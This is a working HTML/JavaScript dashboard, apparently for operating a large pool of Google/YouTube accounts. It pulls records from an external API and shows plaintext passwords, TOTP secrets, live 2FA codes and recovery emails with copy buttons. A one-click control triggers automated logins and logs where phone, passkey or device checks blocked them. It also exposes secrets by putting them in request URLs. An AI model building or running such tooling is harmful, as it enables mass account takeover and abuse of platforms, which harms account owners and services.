<!doctype html>
<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>참교육 스트리밍 — 읽기 전용</title>
<meta name="theme-color" content="#0a0d12">
<style>
*{box-sizing:border-box}
body{font-family:-apple-system,'SF Pro Text',sans-serif;background:#0b0d10;color:#e8ecef;margin:0}
header{padding:14px 20px;background:#111418;border-bottom:1px solid #22282f;position:sticky;top:0;z-index:5}
h1{margin:0 0 8px;font-size:18px}
.stats{display:flex;gap:16px;flex-wrap:wrap;font-size:13px;color:#9aa5b5}
.stats b{color:#e8ecef;font-size:15px}
.stats .ok{color:#3ddc84}
.controls{padding:12px 20px;background:#0f1216;border-bottom:1px solid #22282f;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
input{background:#161a20;border:1px solid #2a323c;color:#e8ecef;padding:9px 12px;border-radius:6px;font-size:14px;flex:1;min-width:200px}
input:focus{outline:0;border-color:#2b6cff}
select{background:#161a20;border:1px solid #2a323c;color:#e8ecef;padding:9px 10px;border-radius:6px;font-size:13px}
#count{color:#8a95a5;font-size:12px;white-space:nowrap}
.badge{display:inline-block;padding:2px 7px;border-radius:10px;font-size:10.5px;font-weight:600}
.b-on{background:#0d3222;color:#3ddc84}
.b-today{background:#0d3222;color:#3ddc84;font-weight:700}
.b-old{background:#2a2f36;color:#8a95a5}
.b-never{background:#2a1e1e;color:#f47070}
.b-off{background:#2a1e1e;color:#f47070}
.b-2fa{background:#1c2740;color:#7dabff}
.b-lock{background:#3a1c1c;color:#ff8080}
.mono{font-family:'SF Mono',Monaco,monospace;color:#c9d2dc;font-size:12px;word-break:break-all}
button{background:#2b6cff;color:#fff;border:0;padding:7px 12px;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600}
button:hover{background:#1e5ae0}
.cp{background:#2a323c;padding:3px 8px;font-size:11px;margin-left:6px;color:#c9d2dc}
.cp:hover{background:#39434f}
.readonly-banner{padding:8px 16px;background:#2a1a00;border-bottom:2px solid #d29922;text-align:center;font-size:13px;color:#d29922;font-weight:700}
@media(max-width:768px){
  header{padding:10px 12px}
  h1{font-size:15px}
  .stats{font-size:11px;gap:8px}
  .controls{padding:8px 12px;gap:6px}
  .td-card{padding:14px!important}
  .td-card .td-grid{grid-template-columns:1fr!important;gap:8px 0!important;font-size:15px!important}
  .td-card .td-email{font-size:17px!important}
  .td-card .td-pw{font-size:17px!important}
  .td-card .td-2fa-code{font-size:24px!important;letter-spacing:3px!important}
  .td-card .cp{padding:6px 14px!important;font-size:13px!important}
}
</style></head>
<body>
<div style="padding:8px 16px;background:#0a1a2a;border-bottom:2px solid #2b6cff;text-align:center;font-size:13px;color:#7dabff;font-weight:700">🔑 계정 조회 + 로그인</div>
<div id="hero-banner" style="position:relative;overflow:hidden;padding:20px;background:linear-gradient(135deg,#0a0d12 0%,#111828 40%,#1a1030 70%,#0a0d12 100%);text-align:center;border-bottom:none">
  <h1 style="margin:0;font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(90deg,#ff9040,#ffcc40,#a060ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">🎬 참교육 스트리밍 계정 (읽기 전용)</h1>
</div>

<div id="accStats" style="padding:8px 20px;background:#0d1520;border-bottom:1px solid #22282f;font-size:13px;color:#9aa5b5;text-align:center"></div>

<header>
  <div class="stats">
    <span>계정 <b id="s-acc">–</b></span>
    <span>세션 <b class="ok" id="s-sess">–</b></span>
    <span>2FA <b id="s-2fa">–</b></span>
  </div>
</header>

<div style="padding:14px 20px;background:#0f1620;border-bottom:1px solid #22282f;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
  <span style="font-size:14px;color:#7dabff;font-weight:700">🔎 계정 검색</span>
  <input id="lookup" placeholder="이메일 입력 후 Enter" style="flex:1;min-width:200px">
  <button id="lookup-btn">조회</button>
  <div id="lookup-result" style="width:100%;display:none;background:#161a20;border:1px solid #2a323c;border-radius:8px;padding:16px;font-size:14px;margin-top:6px"></div>
</div>

<div class="controls">
  <input id="apiToken" type="password" placeholder="🔑 API 토큰" style="flex:0 0 140px;min-width:100px;font-size:12px" oninput="sessionStorage.setItem('gauth_token',this.value)">
  <input id="q" placeholder="🔍 필터…">
  <select id="filter">
    <option value="all">전체</option>
    <option value="2fa">2FA 있음</option>
    <option value="never">미접속만</option>
  </select>
  <span id="count"></span>
</div>

<div id="viewport"><div id="spacer"></div></div>
<div id="pagination" style="padding:12px 20px;background:#0f1216;border-top:1px solid #22282f;display:flex;gap:6px;flex-wrap:wrap;justify-content:center;align-items:center"></div>

<script>
var GAUTH_API = 'https://gauth.cent-solution.online';
var PAGE_SIZE = 50, ALL = [], ALL_ORIGINAL = [], FILTERED = [], PAGE = 1;

function _esc(s){return String(s==null?'':s).replace(/[&<>"'`\\]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;','\\':'&#92;'}[c]})}
function getApiToken(){return sessionStorage.getItem('gauth_token')||''}
(function(){var el=document.getElementById('apiToken');if(el){var t=getApiToken();if(t)el.value=t}})()
function authHeaders(extra){var h=extra||{};var t=getApiToken();if(t)h['Authorization']='Bearer '+t;return h}
function authQuery(url){var t=getApiToken();if(!t)return url;return url+(url.indexOf('?')>=0?'&':'?')+'token='+encodeURIComponent(t)}

function kstTodayMidnightMs(){
  var now=new Date();
  var parts=new Intl.DateTimeFormat('en-CA',{timeZone:'Asia/Seoul',year:'numeric',month:'2-digit',day:'2-digit'}).formatToParts(now);
  var y=parts.find(function(p){return p.type==='year'}).value;
  var m=parts.find(function(p){return p.type==='month'}).value;
  var d=parts.find(function(p){return p.type==='day'}).value;
  return Date.parse(y+'-'+m+'-'+d+'T00:00:00+09:00');
}
function accessBadge(a){
  var mt=a.session_mtime||0;
  if(!mt)return'<span class="badge b-never">미접속</span>';
  if(mt>=kstTodayMidnightMs())return'<span class="badge b-today">오늘</span>';
  var days=Math.floor((Date.now()-mt)/86400000);
  return'<span class="badge b-old">'+(days<=1?'어제':days+'일 전')+'</span>';
}
function cp(v,targetId){
  if(v===undefined||v===null||v==='—')return'';
  var esc=String(v).replace(/"/g,'&quot;').replace(/</g,'&lt;');
  return targetId
    ?'<button class="cp" data-copy-target="'+targetId+'">복사</button>'
    :'<button class="cp" data-copy="'+esc+'">복사</button>';
}
async function doCopy(text){
  if(navigator.clipboard&&navigator.clipboard.writeText){try{await navigator.clipboard.writeText(text);return true}catch{}}
  var ta=document.createElement('textarea');ta.value=text;ta.style.cssText='position:fixed;opacity:0;left:-9999px';
  document.body.appendChild(ta);ta.focus();ta.select();var ok=false;
  try{ok=document.execCommand('copy')}catch{}
  ta.remove();return ok;
}
document.addEventListener('click',async function(e){
  var b=e.target.closest('button.cp');if(!b)return;
  var text=b.dataset.copy;
  if(!text&&b.dataset.copyTarget){var el=document.getElementById(b.dataset.copyTarget);if(el)text=el.textContent.trim()}
  if(!text)return;
  var ok=await doCopy(text);var orig=b.textContent;
  b.textContent=ok?'✓':'❌';setTimeout(function(){b.textContent=orig},900);
});

function _sortByExcelDate(arr){
  var withDate=arr.filter(function(a){return a.account_date});
  var noDate=arr.filter(function(a){return!a.account_date});
  withDate.sort(function(a,b){return b.account_date-a.account_date});
  if(!withDate.length)return noDate.slice();
  var mid=Math.ceil(withDate.length/2);
  return withDate.slice(0,mid).concat(noDate).concat(withDate.slice(mid));
}

async function load(){
  try{
    var r1=await fetch(authQuery(GAUTH_API+'/api/normalized-accounts'),{headers:authHeaders()});
    var r2=await fetch(authQuery(GAUTH_API+'/api/profiles'),{headers:authHeaders()});
    var r3=await fetch(authQuery(GAUTH_API+'/api/failed-accounts'),{headers:authHeaders()});
    var n=await r1.json().catch(function(){return{accounts:[]}});
    var p=await r2.json().catch(function(){return{profiles:[]}});
    var f=await r3.json().catch(function(){return{}});
  }catch(e){n={accounts:[]};p={profiles:[]};f={}}
  var sess=new Set((p.profiles||[]).map(function(x){return x.email||x.folder.replace(/^([^_]+)_(.+)$/,function(_,u,d){return u+'@'+d.replace(/_/g,'.')})}));
  ALL=(n.accounts||[]).map(function(a){
    var fl=(f[a.email]||{});
    return Object.assign({},a,{has_session:sess.has(a.email),lock_reason:fl.reason||null});
  });
  ALL_ORIGINAL=ALL.slice();
  ALL=_sortByExcelDate(ALL);
  document.getElementById('s-acc').textContent=ALL.length.toLocaleString();
  document.getElementById('s-sess').textContent=ALL.filter(function(a){return a.has_session}).length.toLocaleString();
  document.getElementById('s-2fa').textContent=ALL.filter(function(a){return a.totp_secret&&a.totp_secret.trim()}).length.toLocaleString();
  applyFilter();
}

function applyFilter(){
  var q=document.getElementById('q').value.trim().toLowerCase();
  var f=document.getElementById('filter').value;
  FILTERED=ALL.filter(function(a){
    if(q&&!(a.email||'').toLowerCase().includes(q))return false;
    if(f==='2fa'&&!a.totp_secret)return false;
    if(f==='never'&&a.session_mtime)return false;
    return true;
  });
  FILTERED=_sortByExcelDate(FILTERED);
  PAGE=1;
  var totalPages=Math.max(1,Math.ceil(FILTERED.length/PAGE_SIZE));
  document.getElementById('count').textContent=FILTERED.length.toLocaleString()+'개 · '+totalPages+'페이지';
  render();
}

function render(){
  var totalPages=Math.max(1,Math.ceil(FILTERED.length/PAGE_SIZE));
  if(PAGE>totalPages)PAGE=totalPages;
  var start=(PAGE-1)*PAGE_SIZE;
  var end=Math.min(FILTERED.length,start+PAGE_SIZE);
  var slice=FILTERED.slice(start,end);
  var rows=[];
  for(var i=0;i<slice.length;i++){
    var a=slice[i],idx=start+i+1;
    var _em=_esc(a.email),_pw=_esc(a.password||'—'),_ts=_esc(a.totp_secret||'—');
    var yt=a.youtube_url||'',_yt=_esc(yt);
    var _rc=_esc(a.recovery_email||'—');
    var sess=accessBadge(a);
    var tfa=a.totp_secret?'<span class="badge b-2fa">2FA</span>':'';
    var lock=a.lock_reason?'<span class="badge b-lock">🔒 '+_esc(a.lock_reason)+'</span>':'';
    rows.push('<div class="td-card" style="background:#161a20;border:1px solid #2a323c;border-radius:8px;padding:12px;margin-bottom:8px">'
      +'<div class="td-grid" style="display:grid;grid-template-columns:100px 1fr;gap:6px 12px;font-size:13px">'
      +'<div style="color:#8a95a5">#'+idx+'</div><div><b class="td-email" style="color:#ffb469;font-size:14px">'+_em+'</b>'+cp(a.email)+' '+sess+tfa+lock+'</div>'
      +'<div style="color:#8a95a5">비밀번호</div><div class="mono td-pw" style="color:#3ddc84">'+_pw+cp(a.password)+'</div>'
      +'<div style="color:#8a95a5">2FA 시크릿</div><div class="mono td-secret">'+_ts+cp(a.totp_secret)+'</div>'
      +'<div style="color:#8a95a5">2FA 코드</div><div class="mono td-2fa-code" style="color:#7dabff;font-size:18px;font-weight:700;letter-spacing:2px"><span id="jcode-'+idx+'">…</span>'+(a.totp_secret?cp('_','jcode-'+idx):'')+'</div>'
      +'<div style="color:#8a95a5">YouTube</div><div class="mono" style="font-size:11px">'+(yt&&/^https?:\/\//i.test(yt)?'<a href="'+_yt+'" target="_blank" style="color:#ff8a8a">'+_yt+'</a>'+cp(yt):'—')+'</div>'
      +'<div style="color:#8a95a5">복구</div><div class="mono" style="font-size:11px">'+_rc+'</div>'
      +'<div style="color:#8a95a5">동작</div><div><button style="background:#7c3aed;padding:7px 14px;font-size:13px" onclick="programLogin(\''+_em.replace(/'/g,"\\'")+'\',this)">🔑 로그인</button></div>'
      +'</div></div>');
  }
  document.getElementById('spacer').innerHTML=rows.join('');
  renderPagination(totalPages);
  slice.forEach(function(a,i){
    if(!a.totp_secret)return;
    var ci=start+i+1;
    fetch(authQuery(GAUTH_API+'/codes/'+a.totp_secret),{headers:authHeaders()}).then(function(r){return r.json()}).then(function(j){
      var el=document.getElementById('jcode-'+ci);if(el)el.textContent=j.code||'—';
    }).catch(function(){});
  });
}

function renderPagination(totalPages){
  var pg=document.getElementById('pagination');
  if(totalPages<=1){pg.innerHTML='';return}
  function btn(label,page,disabled,active){
    return'<button '+(disabled?'disabled':'')+' style="min-width:36px;background:'+(active?'#2b6cff':'#2a323c')+'" onclick="gotoPage('+page+')">'+label+'</button>';
  }
  var html=btn('«',1,PAGE===1)+btn('‹',PAGE-1,PAGE===1);
  var from=Math.max(1,PAGE-3),to=Math.min(totalPages,PAGE+3);
  if(from>1)html+='<span style="color:#8a95a5">…</span>';
  for(var i=from;i<=to;i++)html+=btn(i,i,false,i===PAGE);
  if(to<totalPages)html+='<span style="color:#8a95a5">…</span>';
  html+=btn('›',PAGE+1,PAGE===totalPages)+btn('»',totalPages,PAGE===totalPages);
  html+='<span style="color:#8a95a5;font-size:12px;margin-left:10px">'+PAGE+' / '+totalPages+'</span>';
  pg.innerHTML=html;
}
function gotoPage(n){
  var total=Math.max(1,Math.ceil(FILTERED.length/PAGE_SIZE));
  PAGE=Math.max(1,Math.min(total,n));render();
}

async function lookup(){
  var email=document.getElementById('lookup').value.trim().toLowerCase();
  var box=document.getElementById('lookup-result');
  if(!email){box.style.display='none';return}
  box.style.display='block';box.innerHTML='<span style="color:#8a95a5">조회 중…</span>';
  try{
    var r=await fetch(authQuery(GAUTH_API+'/api/lookup/'+encodeURIComponent(email)),{headers:authHeaders()});
    var j=await r.json();
  }catch(e){box.innerHTML='<span style="color:#f47070">서버 연결 실패</span>';return}
  if(j.error){box.innerHTML='<span style="color:#f47070">❌ '+_esc(email)+' 찾지 못함</span>';return}
  var code='—';
  if(j.totp_secret){try{var c=await(await fetch(authQuery(GAUTH_API+'/codes/'+j.totp_secret),{headers:authHeaders()})).json();code=c.code||'—'}catch{}}
  box.innerHTML='<div style="display:grid;grid-template-columns:130px 1fr;gap:10px 14px">'
    +'<div style="color:#8a95a5">이메일</div><div><b style="font-size:15px">'+_esc(j.email)+'</b>'+cp(j.email)+'</div>'
    +'<div style="color:#8a95a5">비밀번호</div><div class="mono" style="color:#3ddc84;font-size:15px">'+_esc(j.password||'—')+cp(j.password)+'</div>'
    +'<div style="color:#8a95a5">2FA 시크릿</div><div class="mono">'+_esc(j.totp_secret||'—')+cp(j.totp_secret)+'</div>'
    +'<div style="color:#8a95a5">2FA 코드</div><div class="mono" style="color:#7dabff;font-size:22px;font-weight:700;letter-spacing:3px">'+_esc(code)+cp(code!=='—'?code:'')+'</div>'
    +'<div style="color:#8a95a5">YouTube</div><div class="mono">'+_esc(j.youtube_url||'—')+'</div>'
    +'<div style="color:#8a95a5">복구</div><div class="mono">'+_esc(j.recovery_email||'—')+'</div>'
    +'<div style="color:#8a95a5">동작</div><div><button style="background:#7c3aed;padding:8px 14px;font-size:13px" onclick="programLogin(\''+_esc(j.email).replace(/'/g,"\\'")+'\',this)">🔑 로그인</button></div>'
    +'</div>'
    +'<div id="lookup-next" style="margin-top:14px;border-top:1px solid #22282f;padding-top:10px"></div>';
  if(ALL_ORIGINAL&&ALL_ORIGINAL.length){
    var oi=ALL_ORIGINAL.findIndex(function(a){return a.email===j.email});
    if(oi>=0){
      var nxt=ALL_ORIGINAL.slice(oi+1,oi+51);
      var nb=document.getElementById('lookup-next');
      if(nb&&nxt.length){
        nb.innerHTML='<div style="color:#8a95a5;font-size:12px;margin-bottom:6px">▼ 다음 순번 ('+(oi+2)+'~'+(oi+1+nxt.length)+' / '+ALL_ORIGINAL.length+')</div>'
          +nxt.map(function(a,i){return'<div style="padding:5px 0;border-bottom:1px solid #1a1f26;font-size:12.5px;display:flex;align-items:center;gap:8px">'
            +'<span style="color:#8a95a5;font-family:monospace;min-width:35px">'+(oi+2+i)+'.</span>'
            +'<span style="color:#7dabff;cursor:pointer;flex:1" onclick="document.getElementById(\'lookup\').value=\''+_esc(a.email).replace(/'/g,"\\'")+'\';lookup()">'+_esc(a.email)+'</span>'
            +'<button style="padding:3px 8px;font-size:11px;background:#7c3aed" onclick="programLogin(\''+_esc(a.email).replace(/'/g,"\\'")+'\',this)">🔑</button>'
            +'</div>'}).join('')
      }
    }
  }
}
var LOCK_REASONS=new Set(['PHONE_REQUIRED','PASSKEY_REQUIRED','DEVICE_PROMPT','SECURITY_KEY','BACKUP_CODE','REJECTED','AFTER_TOTP_DEVICE_PROMPT','AFTER_TOTP_PHONE_REQUIRED','AFTER_TOTP_PASSKEY_REQUIRED','WRONG_PASSWORD','UNKNOWN_PASSWORD','2FA_NO_SECRET','TOTP_MAX_ATTEMPTS','BROWSER_UNSAFE']);
async function programLogin(email,btn){
  var orig=btn.textContent;btn.disabled=true;btn.textContent='⏳ 시도 중…';
  var reason='',reached=false;
  try{
    var r=await fetch(authQuery(GAUTH_API+'/api/login-one'),{method:'POST',headers:authHeaders({'content-type':'application/json'}),body:JSON.stringify({email:email})});
    var j=await r.json().catch(function(){return{}});
    reached=true;
    if(r.ok&&j.success!==false&&!j.error){
      btn.textContent='✅ 성공';btn.style.background='#3ddc84';btn.style.color='#000';
      try{await load()}catch(e){location.reload()}
      setTimeout(function(){btn.textContent=orig;btn.disabled=false;btn.style.background='';btn.style.color=''},3000);
      return;
    }
    reason=j.reason||j.error||'HTTP '+r.status;
  }catch(e){reason=e.message}
  btn.textContent='❌ 실패';btn.style.background='#e0503a';
  if(reached&&LOCK_REASONS.has(reason)){alert('❌ '+email+'\n실패: '+reason+'\n\n(사람이 직접 로그인 필요)');}
  else if(reached){alert('❌ '+email+'\n실패: '+reason);}
  else{alert('❌ 서버 도달 실패: '+reason);}
  setTimeout(function(){btn.textContent=orig;btn.disabled=false;btn.style.background=''},2000);
}
document.getElementById('lookup-btn').addEventListener('click',lookup);
document.getElementById('lookup').addEventListener('keydown',function(e){if(e.key==='Enter')lookup()});
document.getElementById('q').addEventListener('input',applyFilter);
document.getElementById('filter').addEventListener('change',applyFilter);

load();
setInterval(load,30000);
</script>
</body></html>
